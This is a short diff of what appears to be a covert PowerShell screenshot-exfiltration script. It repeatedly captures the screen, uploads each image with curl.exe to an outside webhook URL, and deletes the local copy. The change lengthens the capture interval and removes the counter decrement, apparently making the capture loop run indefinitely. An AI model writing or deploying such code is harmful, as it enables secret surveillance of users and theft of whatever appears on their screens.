@@ -1,5 +1,5 @@
 $hookurl = "$dc"
-$seconds = 1 # Screenshot interval
+$seconds = 30 # Screenshot interval
 $a = 2 # Sceenshot amount
 
 # shortened URL Detection
@@ -23,5 +23,5 @@ curl.exe -F "file1=@$filett" $hookurl
 Start-Sleep 1
 Remove-Item -Path $filett
 Start-Sleep $seconds
-$a--
+$a
 }
